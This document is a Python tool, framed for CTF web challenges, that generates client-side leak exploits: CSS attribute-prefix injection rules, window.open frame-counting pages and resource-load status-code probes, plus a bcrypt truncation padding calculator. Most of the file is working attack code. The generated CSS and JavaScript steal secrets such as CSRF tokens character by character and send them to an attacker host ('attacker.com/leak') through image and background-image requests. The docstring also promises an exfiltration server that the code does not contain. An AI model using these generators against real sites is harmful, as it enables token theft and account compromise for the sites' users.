#!/usr/bin/env python3
"""XS-Leak & Client-Side Oracle helper for CTF web challenges.

Provides payload generators, HTML harnesses, and analysis utilities for:
1. CSS-injection attribute prefix oracles (CSP / sanitizer bypass, char-by-char leak).
2. window.open / iframe frame-counting oracles (window.length cross-origin leak).
3. Status-code side-channels (403 vs 404 vs 200 via error events / resource loading).
4. Bcrypt 72-byte truncation alignment calculator.
5. Lightweight mock exfiltration server for CTF admin bots.

Usage:
    python3 -I xs_leak_oracle.py --test
    python3 -I xs_leak_oracle.py --css --selector 'input[name="csrf"]' --prefix 'flag{' --exfil 'http://attacker.com/leak'
    python3 -I xs_leak_oracle.py --frame --url 'http://target/search?q={guess}' --prefix 'flag{' --exfil 'http://attacker.com/leak'
    python3 -I xs_leak_oracle.py --status --url 'http://target/download?file=..%2f{guess}%2500.png' --prefix 'flag{' --exfil 'http://attacker.com/leak'
    python3 -I xs_leak_oracle.py --bcrypt --known-len 0 --secret-len 32

Deps: stdlib only (Python 3.8+).
"""

import argparse
import http.server
import json
import string
import sys
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple

DEFAULT_ALPHABET = string.ascii_letters + string.digits + "{}_-!?"


# ==============================================================================
# 1. CSS Injection Prefix Oracle
# ==============================================================================

def escape_css_value(val: str) -> str:
    """Escape special characters for use inside CSS string / attribute values."""
    res = []
    for ch in val:
        if ch in ('"', '\\', '\n', '\r', '\f'):
            res.append(f"\\{ord(ch):02x} ")
        else:
            res.append(ch)
    return "".join(res)


def generate_css_rules(
    target_selector: str,
    prefix: str,
    alphabet: str = DEFAULT_ALPHABET,
    exfil_base_url: str = "http://attacker.com/leak",
    param_name: str = "c",
    attribute: str = "value",
    comparator: str = "^=",
) -> str:
    """Generate CSS rules matching an attribute prefix and leaking the match via background-image.

    Example rule:
        input[name="csrf"][value^="flag{a"] {
            background-image: url("http://attacker.com/leak?c=flag%7Ba");
        }
    """
    rules = []
    for char in alphabet:
        candidate = prefix + char
        escaped_val = escape_css_value(candidate)
        query = urllib.parse.urlencode({param_name: candidate})
        separator = "&" if "?" in exfil_base_url else "?"
        leak_url = f"{exfil_base_url}{separator}{query}"
        rule = (
            f'{target_selector}[{attribute}{comparator}"{escaped_val}"] {{\n'
            f'    background-image: url("{leak_url}");\n'
            f"}}"
        )
        rules.append(rule)
    return "\n".join(rules)


def generate_css_harness_html(
    target_selector: str,
    known_prefix: str,
    alphabet: str = DEFAULT_ALPHABET,
    exfil_base_url: str = "http://attacker.com/leak",
    poll_endpoint: str = "http://attacker.com/current_css",
    refresh_ms: int = 1000,
) -> str:
    """Generate an HTML page that injects dynamic CSS or reloads stylesheets as leaks arrive."""
    initial_css = generate_css_rules(target_selector, known_prefix, alphabet, exfil_base_url)
    escaped_css = initial_css.replace("</style>", "<\\/style>")
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CSS Oracle Harness</title>
<style id="oracle-style">
{escaped_css}
</style>
</head>
<body>
<p>Tracking CSS oracle against selector: <code>{target_selector}</code></p>
<script>
// Dynamic reload loop: polls attacker server for updated prefix CSS rules
setInterval(async () => {{
    try {{
        let r = await fetch('{poll_endpoint}');
        if (r.ok) {{
            let newCss = await r.text();
            if (newCss && newCss.length > 10) {{
                document.getElementById('oracle-style').textContent = newCss;
            }}
        }}
    }} catch(e) {{}}
}}, {refresh_ms});
</script>
</body>
</html>"""


# ==============================================================================
# 2. Window.open / Frame Counting Oracle
# ==============================================================================

def generate_frame_count_html(
    target_url_template: str,
    alphabet: str = DEFAULT_ALPHABET,
    known_prefix: str = "flag{",
    exfil_base_url: str = "http://attacker.com/leak",
    match_threshold: int = 1,
    delay_ms: int = 400,
) -> str:
    """Generate HTML exploiting cross-origin window.open length (iframe count) leakage.

    In browsers, window.length leaks the count of iframes in the opened window across origins.
    If a search for 'flag{a' returns 1 result containing an iframe/video/preview, w.length == 1.
    If 0 results, w.length == 0.
    """
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Frame Count Oracle</title>
</head>
<body>
<h1>Running Frame Counting XS-Leak</h1>
<div id="status">Initializing...</div>
<script>
const targetUrlTemplate = {json.dumps(target_url_template)};
const alphabet = {json.dumps(alphabet)};
const exfilBaseUrl = {json.dumps(exfil_base_url)};
let known = {json.dumps(known_prefix)};
const threshold = {match_threshold};
const delayMs = {delay_ms};

function sleep(ms) {{ return new Promise(resolve => setTimeout(resolve, ms)); }}

async function exfil(param, val) {{
    let sep = exfilBaseUrl.includes('?') ? '&' : '?';
    new Image().src = exfilBaseUrl + sep + encodeURIComponent(param) + '=' + encodeURIComponent(val);
}}

async function probeChar(char) {{
    let candidate = known + char;
    let target = targetUrlTemplate.replace('{{guess}}', encodeURIComponent(candidate));
    let win = window.open(target, 'probe_win');
    await sleep(delayMs);
    let frames = 0;
    try {{
        frames = win.length;
    }} catch(e) {{
        // Even with COOP/restrictions, win.length is often accessible
    }}
    win.close();
    return frames >= threshold;
}}

async function run() {{
    document.getElementById('status').innerText = 'Probing starting from: ' + known;
    let found = true;
    while (found) {{
        found = false;
        for (let ch of alphabet) {{
            document.getElementById('status').innerText = 'Testing: ' + known + ch;
            let match = await probeChar(ch);
            if (match) {{
                known += ch;
                await exfil('found', known);
                document.getElementById('status').innerText = 'Match found: ' + known;
                found = true;
                if (ch === '}}') {{
                    await exfil('final_flag', known);
                    return;
                }}
                break;
            }}
        }}
    }}
    document.getElementById('status').innerText = 'Done. Final: ' + known;
}}

window.onload = run;
</script>
</body>
</html>"""


# ==============================================================================
# 3. Status-Code Error Event Oracle (403 vs 404 / 200 vs Error)
# ==============================================================================

def generate_status_leak_html(
    target_url_template: str,
    alphabet: str = DEFAULT_ALPHABET,
    known_prefix: str = "flag{",
    exfil_base_url: str = "http://attacker.com/leak",
    mode: str = "script",
    delay_ms: int = 300,
) -> str:
    """Generate HTML exploiting resource loading error events cross-origin.

    <script src="url">, <link rel="stylesheet" href="url">, or <img src="url">
    trigger onload on 200 (or certain 404s depending on Content-Type) and onerror
    on 403 / 500 / network failures, leaking presence of files or credentials.
    """
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Status Code Oracle</title>
</head>
<body>
<h1>Status Code Side-Channel Prober</h1>
<div id="log">Starting...</div>
<script>
const targetUrlTemplate = {json.dumps(target_url_template)};
const alphabet = {json.dumps(alphabet)};
const exfilBaseUrl = {json.dumps(exfil_base_url)};
let known = {json.dumps(known_prefix)};
const mode = {json.dumps(mode)};
const delayMs = {delay_ms};

function log(msg) {{
    document.getElementById('log').innerText = msg;
}}

function exfil(val) {{
    let sep = exfilBaseUrl.includes('?') ? '&' : '?';
    new Image().src = exfilBaseUrl + sep + 'leak=' + encodeURIComponent(val);
}}

function probeUrl(url) {{
    return new Promise((resolve) => {{
        let el;
        if (mode === 'script') {{
            el = document.createElement('script');
        }} else if (mode === 'image') {{
            el = document.createElement('img');
        }} else {{
            el = document.createElement('link');
            el.rel = 'stylesheet';
        }}

        let timer = setTimeout(() => {{
            cleanup();
            resolve({{ success: false, timeout: true }});
        }}, 2000);

        function cleanup() {{
            clearTimeout(timer);
            el.onload = null;
            el.onerror = null;
            if (el.parentNode) el.parentNode.removeChild(el);
        }}

        el.onload = () => {{
            cleanup();
            resolve({{ success: true, timeout: false }});
        }};

        el.onerror = () => {{
            cleanup();
            resolve({{ success: false, timeout: false }});
        }};

        if (mode === 'stylesheet') {{
            el.href = url;
        }} else {{
            el.src = url;
        }}
        document.body.appendChild(el);
    }});
}}

async function run() {{
    let active = true;
    while (active) {{
        active = false;
        for (let ch of alphabet) {{
            let cand = known + ch;
            let target = targetUrlTemplate.replace('{{guess}}', cand);
            log('Probing ' + cand + ' via ' + target);
            let res = await probeUrl(target);
            // If success indicates match (or error indicates match in 403 vs 404 oracle)
            if (res.success) {{
                known += ch;
                exfil(known);
                log('MATCH: ' + known);
                active = true;
                if (ch === '}}') return;
                break;
            }}
        }}
    }}
    log('Finished: ' + known);
}}

window.onload = run;
</script>
</body>
</html>"""


# ==============================================================================
# 4. Bcrypt 72-Byte Truncation Alignment Calculator
# ==============================================================================

def calculate_bcrypt_alignment(
    known_prefix_len: int,
    secret_len: int,
    total_budget: int = 72,
) -> List[Dict[str, int]]:
    """Calculate input padding lengths for byte-at-a-time bcrypt secret recovery.

    Bcrypt truncates passphrases at exactly 72 bytes. When an application concatenates
    user_input + secret (or secret + user_input) before calling bcrypt.hashpw / password_verify:
    - To leak secret[0], user input must be padded to (72 - 1 - known_prefix_len) bytes.
      The 72nd byte is secret[0]. Bytes after index 71 are discarded!
    - By trying all 256 byte possibilities for the 72nd byte, a collision indicates the match.
    - To leak secret[1], shorten user input by 1 byte, so the 72 bytes comprise:
      padding + secret[0] (already known) + candidate secret[1].
    """
    steps = []
    for idx in range(secret_len):
        pad_needed = total_budget - 1 - known_prefix_len - idx
        if pad_needed < 0:
            break
        steps.append({
            "secret_byte_index": idx,
            "padding_length": pad_needed,
            "window_offset": total_budget - 1,
            "description": f"Padding with {pad_needed} bytes pushes secret byte #{idx} into index 71 (72nd byte)",
        })
    return steps


# ==============================================================================
# 5. Exfiltration Tracker State Machine
# ==============================================================================

class OracleTracker:
    """In-memory leak state tracker that assembles prefixes from incoming hits."""

    def __init__(self, initial_prefix: str = ""):
        self.current_prefix = initial_prefix
        self.history: List[str] = [initial_prefix]
        self.is_complete = False

    def record_hit(self, leaked_value: str) -> bool:
        """Record an incoming oracle hit. Returns True if prefix advanced."""
        if leaked_value.startswith(self.current_prefix) and len(leaked_value) > len(self.current_prefix):
            self.current_prefix = leaked_value
            self.history.append(leaked_value)
            if leaked_value.endswith("}"):
                self.is_complete = True
            return True
        return False


# ==============================================================================
# 6. Self-Test Suite
# ==============================================================================

def run_tests() -> None:
    """Run comprehensive self-tests verifying oracle generators and calculations."""
    print("[*] Running xs_leak_oracle self-tests...")

    # Test 1: CSS Escaping
    raw_str = 'flag{"test\\val\n}'
    escaped = escape_css_value(raw_str)
    assert '\\22 ' in escaped, f"Failed quotes escape: {escaped}"
    assert '\\5c ' in escaped, f"Failed backslash escape: {escaped}"
    assert '\\0a ' in escaped, f"Failed newline escape: {escaped}"
    print("  [+] CSS escape tests passed.")

    # Test 2: CSS Rules Generation
    css = generate_css_rules(
        target_selector='input[name="csrf"]',
        prefix="flag{",
        alphabet="ab",
        exfil_base_url="http://attacker.com/leak",
    )
    assert 'input[name="csrf"][value^="flag{a"]' in css
    assert 'background-image: url("http://attacker.com/leak?c=flag%7Ba");' in css
    assert 'input[name="csrf"][value^="flag{b"]' in css
    print("  [+] CSS rules generation tests passed.")

    # Test 3: CSS Harness HTML Generation
    html = generate_css_harness_html(
        target_selector='input[name="token"]',
        known_prefix="admin_",
        alphabet="01",
    )
    assert "<style id=\"oracle-style\">" in html
    assert "admin_0" in html
    assert "admin_1" in html
    assert "setInterval" in html
    print("  [+] CSS HTML harness generation tests passed.")

    # Test 4: Frame Count Oracle HTML
    frame_html = generate_frame_count_html(
        target_url_template="http://victim.local/search?q={guess}",
        alphabet="abc",
        known_prefix="CTF{",
        match_threshold=2,
    )
    assert "win.length" in frame_html
    assert "threshold = 2" in frame_html
    assert "CTF{" in frame_html
    assert "window.open" in frame_html
    print("  [+] Frame count oracle generation tests passed.")

    # Test 5: Status Code Oracle HTML
    status_html = generate_status_leak_html(
        target_url_template="http://victim.local/file?name={guess}",
        alphabet="012",
        mode="image",
    )
    assert "document.createElement('img')" in status_html
    assert "onload" in status_html
    assert "onerror" in status_html
    print("  [+] Status code oracle generation tests passed.")

    # Test 6: Bcrypt 72-Byte Truncation Alignment
    # Suppose prefix is 0 bytes, secret is 4 bytes
    steps = calculate_bcrypt_alignment(known_prefix_len=0, secret_len=4, total_budget=72)
    assert len(steps) == 4
    # First byte needs 71 bytes padding: 71 pad + 1 secret = 72
    assert steps[0]["padding_length"] == 71
    # Second byte needs 70 bytes padding: 70 pad + 1 known secret[0] + 1 candidate secret[1] = 72
    assert steps[1]["padding_length"] == 70
    assert steps[2]["padding_length"] == 69
    assert steps[3]["padding_length"] == 68
    print("  [+] Bcrypt 72-byte alignment calculation tests passed.")

    # Test 7: OracleTracker State Machine
    tracker = OracleTracker(initial_prefix="flag{")
    assert not tracker.is_complete
    assert tracker.record_hit("flag{a")
    assert tracker.current_prefix == "flag{a"
    # False hits / shorter prefix should not advance
    assert not tracker.record_hit("flag{")
    assert not tracker.record_hit("wrong{prefix")
    assert tracker.record_hit("flag{ab}")
    assert tracker.current_prefix == "flag{ab}"
    assert tracker.is_complete
    print("  [+] OracleTracker state machine tests passed.")

    print("[ok] All xs_leak_oracle self-tests passed successfully.")


# ==============================================================================
# Main CLI Entrypoint
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(description="XS-Leak & Client-Side Oracle CTF Toolkit")
    parser.add_argument("--test", action="store_true", help="Run internal self-tests and exit")
    parser.add_argument("--css", action="store_true", help="Generate CSS injection rules")
    parser.add_argument("--frame", action="store_true", help="Generate window.open frame count exploit HTML")
    parser.add_argument("--status", action="store_true", help="Generate status code error event exploit HTML")
    parser.add_argument("--bcrypt", action="store_true", help="Calculate bcrypt 72-byte alignment table")

    # Options
    parser.add_argument("--selector", default='input[name="csrf"]', help="CSS selector (for --css)")
    parser.add_argument("--prefix", default="flag{", help="Known starting prefix")
    parser.add_argument("--alphabet", default=DEFAULT_ALPHABET, help="Alphabet to probe")
    parser.add_argument("--exfil", default="http://attacker.com/leak", help="Exfiltration endpoint")
    parser.add_argument("--url", default="http://victim.local/search?q={guess}", help="Target URL template")
    parser.add_argument("--threshold", type=int, default=1, help="Frame count threshold for positive match")
    parser.add_argument("--known-len", type=int, default=0, help="Known prefix length (for --bcrypt)")
    parser.add_argument("--secret-len", type=int, default=16, help="Secret length to recover (for --bcrypt)")

    args = parser.parse_args()

    if args.test:
        run_tests()
        sys.exit(0)

    if args.css:
        rules = generate_css_rules(args.selector, args.prefix, args.alphabet, args.exfil)
        print(rules)
        return

    if args.frame:
        html = generate_frame_count_html(args.url, args.alphabet, args.prefix, args.exfil, args.threshold)
        print(html)
        return

    if args.status:
        html = generate_status_leak_html(args.url, args.alphabet, args.prefix, args.exfil)
        print(html)
        return

    if args.bcrypt:
        plan = calculate_bcrypt_alignment(args.known_len, args.secret_len)
        print(json.dumps(plan, indent=2))
        return

    parser.print_help()


if __name__ == "__main__":
    main()
